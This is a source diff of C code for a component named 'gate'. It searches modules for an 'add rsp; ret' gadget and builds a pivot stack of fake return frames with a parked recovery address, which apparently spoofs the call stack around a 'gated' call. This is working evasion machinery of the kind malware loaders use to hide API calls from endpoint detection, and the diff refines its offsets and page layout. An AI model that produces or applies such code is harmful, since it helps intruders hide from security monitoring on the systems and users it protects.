@@ -110,7 +110,10 @@ static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long
 				 * fn-owned shadow space. */
 				if (p[0] != 0x48 || p[1] != 0x83 || p[2] != 0xC4 || p[4] != 0xC3)
 					continue;
-				if (p[3] < 0x40 || p[3] > 0x70)
+				/* only 0x48/0x50: 8-aligned and strictly past the 8-arg
+				 * stack block (0x28..0x48) - otherwise the parked recovery
+				 * address would overlap an arg slot before the call */
+				if (p[3] != 0x48 && p[3] != 0x50)
 					continue;
 				KD("gate: gadget hit mod=", (long)m);
 				/* extent from the gadget address through its function frame;
@@ -140,7 +143,7 @@ static void gate_init_spoof(void)
 	if (g_gate_spoof_ready != 0)
 		return;
 
-	g_gate_page = (unsigned char *)VirtualAlloc(NULL, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	g_gate_page = (unsigned char *)VirtualAlloc(NULL, 0x40000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (g_gate_page == NULL) {
 		KD("gate: plain (no page)", 0);
 		g_gate_spoof_ready = 2;
@@ -169,8 +172,14 @@ static void gate_init_spoof(void)
 	 *   [pivot+0x10] = recovery address (the gadget's ret lands here)
 	 * fn preserves rbp (=ctx+0x10 from the asm prologue), so the popped
 	 * value matches what gate_spoof_recovery expects. */
-	g_gate_pivot = (unsigned long long)g_gate_page + 0x8000;
+	/* pivot near the top: 252KB of headroom below for the gated call's
+	 * tree, chain + parked recovery laid above toward the page end */
+	g_gate_pivot = (unsigned long long)g_gate_page + 0x3f000;
 	slot = g_gate_pivot + 0x80; /* above the parked recovery slot */
+	if (slot + 0x300 > g_gate_pivot + 0x1000) { /* chain must fit the top margin */
+		g_gate_spoof_ready = 2;
+		return;
+	}
 	for (i = 0; i < 4; i++) {
 		*(unsigned long long *)slot = fr[i];
 		slot += sizes[i];
